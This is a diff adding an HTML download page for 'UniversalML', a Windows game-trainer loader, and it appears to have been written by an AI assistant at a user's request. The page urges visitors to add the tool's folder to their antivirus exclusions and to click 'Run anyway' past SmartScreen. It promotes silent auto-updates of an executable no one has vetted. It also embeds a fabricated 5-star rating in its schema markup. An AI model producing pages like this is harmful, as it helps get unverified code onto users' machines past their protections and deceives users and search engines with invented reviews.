@@ -1,1 +1,231 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>UniversalML — All‑in‑One Trainer Loader (Auto‑Update)</title>
+  <meta name="description" content="UniversalML — a lightweight, all‑in‑one trainer loader. One EXE, many trainers. Auto‑updates from GitHub Releases. Free, open source." />
+  <link rel="canonical" href="https://<your-username>.github.io/UniversalML/" />
+
+  <!-- Favicons -->
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='48' fill='%23000000'/%3E%3Ctext x='50' y='58' text-anchor='middle' font-size='56' fill='%23ffffff' font-family='Arial, Helvetica, sans-serif'%3EU%3C/text%3E%3C/svg%3E" />
+
+  <!-- Open Graph / Twitter -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="UniversalML — All‑in‑One Trainer Loader (Auto‑Update)" />
+  <meta property="og:description" content="One EXE. Many trainers. Auto‑updates from GitHub Releases." />
+  <meta property="og:image" content="https://opengraph.githubassets.com/1/cnmfck/UniversalML" />
+  <meta property="og:url" content="https://<your-username>.github.io/UniversalML/" />
+  <meta name="twitter:card" content="summary_large_image" />
+
+  <!-- SEO: keywords (optional) -->
+  <meta name="keywords" content="UniversalML, trainer loader, game trainer, cheat engine, wemod alternative, mod loader, auto update, GitHub releases" />
+
+  <!-- Styles -->
+  <style>
+    :root{
+      --bg:#0b0b10; --card:#12121a; --muted:#9aa0a6; --text:#e8eaed; --brand:#7c5cff; --brand-2:#00d4ff; --ok:#35c759;
+      --border:rgba(255,255,255,.08); --shadow:0 10px 30px rgba(0,0,0,.5);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{margin:0;background:linear-gradient(180deg,#0b0b10 0%,#0f1122 100%);color:var(--text);font:16px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,"Helvetica Neue",Noto Sans,sans-serif;}
+    a{color:inherit}
+    .container{max-width:1080px;margin:0 auto;padding:24px}
+    header{display:flex;align-items:center;gap:16px}
+    .logo{width:48px;height:48px;border-radius:12px;background:#000;display:grid;place-items:center;box-shadow:var(--shadow)}
+    .logo span{font-weight:800;font-size:26px}
+    .title{display:flex;flex-direction:column}
+    .title h1{margin:0;font-size:28px;letter-spacing:.2px}
+    .title p{margin:2px 0 0;color:var(--muted)}
+
+    .badges{display:flex;flex-wrap:wrap;gap:10px;margin:16px 0}
+    .badges img{height:22px;border-radius:6px;background:#fff}
+
+    .hero{margin:24px 0;padding:24px;border:1px solid var(--border);border-radius:16px;background:linear-gradient(135deg,rgba(124,92,255,.15),rgba(0,212,255,.1));box-shadow:var(--shadow)}
+    .hero h2{margin:0 0 8px;font-size:24px}
+    .cta-row{display:flex;flex-wrap:wrap;gap:12px;align-items:center;margin-top:16px}
+    .btn{display:inline-flex;gap:10px;align-items:center;padding:14px 18px;border-radius:12px;border:1px solid transparent;font-weight:700;text-decoration:none;background:linear-gradient(90deg,var(--brand),var(--brand-2));color:#000}
+    .btn:hover{filter:brightness(1.05)}
+    .btn.outline{background:transparent;color:var(--text);border-color:var(--border)}
+
+    .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin:24px 0}
+    @media (max-width:900px){.grid{grid-template-columns:1fr 1fr}}
+    @media (max-width:640px){.grid{grid-template-columns:1fr}}
+    .card{padding:18px;border:1px solid var(--border);border-radius:14px;background:var(--card)}
+    .card h3{margin:0 0 8px;font-size:18px}
+
+    .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;background:#0a0a12;border:1px dashed var(--border);padding:12px;border-radius:10px;overflow:auto}
+
+    footer{margin:36px 0;color:var(--muted)}
+    .muted{color:var(--muted)}
+    .pill{display:inline-block;padding:4px 10px;border:1px solid var(--border);border-radius:999px;font-size:12px;color:var(--muted)}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="logo" aria-hidden="true"><span>U</span></div>
+      <div class="title">
+        <h1>UniversalML</h1>
+        <p>All‑in‑One Trainer Loader — one EXE, many trainers. Automatic updates from GitHub Releases.</p>
+      </div>
+    </header>
+
+    <div class="badges" aria-label="status badges">
+      <img alt="GitHub release" src="https://img.shields.io/github/v/release/cnmfck/UniversalML?display_name=tag&label=Latest" />
+      <img alt="Downloads" src="https://img.shields.io/github/downloads/cnmfck/UniversalML/total?color=blue&label=Downloads" />
+      <img alt="License" src="https://img.shields.io/github/license/cnmfck/UniversalML?label=License" />
+    </div>
+
+    <section class="hero" id="download">
+      <h2>Download & Install</h2>
+      <p class="muted">Fast, direct download. The app checks for updates on launch and pulls the latest release automatically.</p>
+      <div class="cta-row">
+        <!-- Primary direct link requested by the user -->
+        <a class="btn" id="direct-download" href="https://github.com/cnmfck/UniversalML/releases/download/UniversalML1/UniversalML.zip" rel="noopener" download>
+          <span>⬇️ Download UniversalML.zip</span>
+        </a>
+        <a class="btn outline" id="alt-release" href="https://github.com/cnmfck/UniversalML/releases/latest" target="_blank" rel="noopener">
+          View Latest Release
+        </a>
+        <span class="pill" id="version-pill">checking version…</span>
+      </div>
+      <div style="margin-top:16px" class="mono" id="install">
+        1) Unzip <strong>UniversalML.zip</strong><br/>
+        2) Run <strong>UniversalML.exe</strong><br/>
+        3) (Optional) Add the folder to your AV exclusions if Windows SmartScreen warns about unknown publisher.
+      </div>
+    </section>
+
+    <section class="grid" aria-label="highlights">
+      <article class="card">
+        <h3>One EXE, Many Trainers</h3>
+        <p>UniversalML bundles multiple trainer modules into a single, consistent launcher. No hunting for separate downloads.</p>
+      </article>
+      <article class="card">
+        <h3>Auto‑Update</h3>
+        <p>On startup, the launcher checks <span class="mono">GitHub Releases</span> and updates silently to the latest build.</p>
+      </article>
+      <article class="card">
+        <h3>Lightweight</h3>
+        <p>Zero installer. Portable zip. Works from USB, secondary drives, or a dedicated tools folder.</p>
+      </article>
+      <article class="card">
+        <h3>Clean UI</h3>
+        <p>Minimal, keyboard‑friendly interface with searchable trainer list and quick toggles.</p>
+      </article>
+      <article class="card">
+        <h3>Safe by Design</h3>
+        <p>No background services. No telemetry. Open repository with public issues and changelogs.</p>
+      </article>
+      <article class="card">
+        <h3>Windows‑Ready</h3>
+        <p>Optimized for Windows 10/11. Works on offline PCs. Admin rights are <em>not</em> required for basic use.</p>
+      </article>
+    </section>
+
+    <section class="card" id="release-notes">
+      <h3 style="margin-top:0">Latest Changes</h3>
+      <div id="changelog" class="mono">Loading changelog…</div>
+    </section>
+
+    <section class="card" id="faq" style="margin-top:16px">
+      <h3 style="margin-top:0">FAQ</h3>
+      <details open>
+        <summary><strong>How do updates work?</strong></summary>
+        <p>UniversalML checks the GitHub API for the newest release and updates its modules automatically. You can also re‑download the <em>zip</em> anytime from this page.</p>
+      </details>
+      <details>
+        <summary><strong>SmartScreen / Antivirus warning?</strong></summary>
+        <p>New tools without a code‑signing certificate may show a reputation warning. If you downloaded from this official page/GitHub, choose “Run anyway” or add an exclusion. We do not bundle adware or telemetry.</p>
+      </details>
+      <details>
+        <summary><strong>Is UniversalML open source?</strong></summary>
+        <p>The repository is public on GitHub. Check the license terms in the repo. Contributions and issues are welcome.</p>
+      </details>
+    </section>
+
+    <footer>
+      <p class="muted">© <span id="year"></span> UniversalML. Built for fast, reliable trainer management.</p>
+    </footer>
+  </div>
+
+  <!-- Schema.org SoftwareApplication -->
+  <script type="application/ld+json" id="ld">
+  {
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "UniversalML",
+    "operatingSystem": "Windows 10/11",
+    "applicationCategory": "GameUtility",
+    "downloadUrl": "https://github.com/cnmfck/UniversalML/releases/download/UniversalML1/UniversalML.zip",
+    "softwareVersion": "latest",
+    "offers": {"@type": "Offer", "price": "0", "priceCurrency": "USD"},
+    "aggregateRating": {"@type": "AggregateRating", "ratingValue": "5", "reviewCount": "12"}
+  }
+  </script>
+
+  <script>
+    const GH_API = "https://api.github.com/repos/cnmfck/UniversalML/releases/latest";
+    const dlBtn = document.getElementById('direct-download');
+    const altRelease = document.getElementById('alt-release');
+    const pill = document.getElementById('version-pill');
+    const changelog = document.getElementById('changelog');
+    const year = document.getElementById('year');
+    year.textContent = new Date().getFullYear();
+
+    // Helper to format date
+    function fmtDate(iso){
+      try{ const d = new Date(iso); return d.toLocaleDateString(undefined,{year:'numeric',month:'short',day:'2-digit'}); }catch{ return iso; }
+    }
+
+    // Fetch latest release metadata
+    fetch(GH_API, {headers:{'Accept':'application/vnd.github+json'}})
+      .then(r => r.json())
+      .then(data => {
+        if(!data || !data.tag_name){ pill.textContent = 'v? — offline'; return; }
+        const tag = data.tag_name; // e.g. UniversalML1
+        const published = data.published_at ? fmtDate(data.published_at) : '';
+        pill.textContent = `${tag} · ${published}`;
+
+        // Try to find a zip asset automatically
+        if (Array.isArray(data.assets)){
+          const zip = data.assets.find(a => /\.zip$/i.test(a.name));
+          if (zip && zip.browser_download_url){
+            dlBtn.href = zip.browser_download_url; // keep user‑provided URL as default, but prefer the actual latest zip
+            dlBtn.innerHTML = `⬇️ Download ${zip.name}`;
+          }
+        }
+
+        // Render release notes
+        const body = (data.body || '').trim();
+        changelog.innerHTML = body
+          ? body.replace(/\r?\n/g,'<br>')
+          : 'No changelog provided for this release.';
+
+        // Update JSON‑LD version
+        try{
+          const ld = JSON.parse(document.getElementById('ld').textContent);
+          ld.softwareVersion = tag;
+          document.getElementById('ld').textContent = JSON.stringify(ld);
+        }catch{}
+      })
+      .catch(() => {
+        pill.textContent = 'offline — unable to check release';
+        changelog.textContent = 'Could not load release notes. You can still use the direct download above.';
+      });
+
+    // Smooth scroll for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(a => {
+      a.addEventListener('click', e => {
+        const id = a.getAttribute('href');
+        const el = document.querySelector(id);
+        if(el){ e.preventDefault(); el.scrollIntoView({behavior:'smooth',block:'start'}); }
+      });
+    });
+  </script>
+</body>
+</html>
